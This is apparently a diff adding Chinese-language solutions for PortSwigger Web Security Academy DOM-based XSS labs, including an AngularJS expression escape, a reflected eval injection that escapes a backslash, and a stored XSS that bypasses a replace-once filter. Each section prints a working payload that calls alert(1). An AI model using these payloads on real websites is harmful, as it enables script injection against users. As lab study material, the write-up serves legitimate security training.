@@ -291,3 +291,169 @@ document.write('</select>');
 ```
 https://ac721f361f19caf4c02c4c270073000e.web-security-academy.net/product?productId=1&storeId=123</option><script>alert(1)</script>
 ```
+
+## [Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
+### 題目敘述
+ This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
+
+AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
+
+To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function. 
+### 題目解釋
+AngularJS
+
+### 解答
+
+直接送最普通的會發現被 Encode 了
+```
+<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1>
+```
+
+Google 找到 Angular 的 XSS 方法在  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md) 上
+
+```
+{{constructor.constructor('alert(1)')()}}
+```
+
+## [Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
+### 題目敘述
+ This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+
+To solve this lab, create an injection that calls the alert() function. 
+### 題目解釋
+eval 搭配 Escape 雙引號，但沒有 Escape 反斜線
+
+### 解答
+
+觀察原始碼
+
+```
+ <script>search('search-results')</script>
+```
+
+```javascript=
+function search(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            eval('var searchResultsObj = ' + this.responseText);
+            displaySearchResults(searchResultsObj);
+        }
+    };
+    xhr.open("GET", path + window.location.search);
+    xhr.send();
+
+    function displaySearchResults(searchResultsObj) {
+        var blogHeader = document.getElementsByClassName("blog-header")[0];
+        var blogList = document.getElementsByClassName("blog-list")[0];
+        var searchTerm = searchResultsObj.searchTerm
+        var searchResults = searchResultsObj.results
+
+        var h1 = document.createElement("h1");
+        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
+        blogHeader.appendChild(h1);
+        var hr = document.createElement("hr");
+        blogHeader.appendChild(hr)
+
+        for (var i = 0; i < searchResults.length; ++i)
+        {
+            var searchResult = searchResults[i];
+            if (searchResult.id) {
+                var blogLink = document.createElement("a");
+                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);
+
+                if (searchResult.headerImage) {
+                    var headerImage = document.createElement("img");
+                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
+                    blogLink.appendChild(headerImage);
+                }
+
+                blogList.appendChild(blogLink);
+            }
+
+            blogList.innerHTML += "<br/>";
+
+            if (searchResult.title) {
+                var title = document.createElement("h2");
+                title.innerText = searchResult.title;
+                blogList.appendChild(title);
+            }
+
+            if (searchResult.summary) {
+                var summary = document.createElement("p");
+                summary.innerText = searchResult.summary;
+                blogList.appendChild(summary);
+            }
+
+            if (searchResult.id) {
+                var viewPostButton = document.createElement("a");
+                viewPostButton.setAttribute("class", "button is-small");
+                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
+                viewPostButton.innerText = "View post";
+            }
+        }
+
+        var linkback = document.createElement("div");
+        linkback.setAttribute("class", "is-linkback");
+        var backToBlog = document.createElement("a");
+        backToBlog.setAttribute("href", "/");
+        backToBlog.innerText = "Back to Blog";
+        linkback.appendChild(backToBlog);
+        blogList.appendChild(linkback);
+    }
+}
+
+```
+
+直覺 `eval('var searchResultsObj = ' + this.responseText);` 很可疑
+
+直接對他下斷點搜尋 `meow` 觀察結果
+
+他的 `this.responseText` 值會是 
+```
+{"results":[],"searchTerm":"meow"}
+```
+
+所以我的 Payload 如果輸入
+```
+meow"} + alert(1); //
+```
+
+他的完整會變成
+```
+{"results":[],"searchTerm":"meow\"} + alert(1); //"}
+```
+
+發現 `meow` 後面的 `"` 被 Escape 了
+
+最終 Payload
+
+```
+meow\"} + alert(1); //
+```
+
+## [Lab: Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
+### 題目敘述
+ This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. 
+### 題目解釋
+JS Replace 小特性，只會 Replace 第一個
+
+### 解答
+
+觀察原始碼，重點應該在這邊
+```javascript=
+function escapeHTML(html) {
+    return html.replace('<', '&lt;').replace('>', '&gt;');
+}
+```
+
+有一個 JS 的小特性，他的 Replace 只會套用第一個參數
+```
+"<><>".replace("<",1).replace(">",2) 會回傳 `12<>`
+```
+
+所以 Payload
+
+```
+<> <img src=1 onerror=alert(1)>
+```
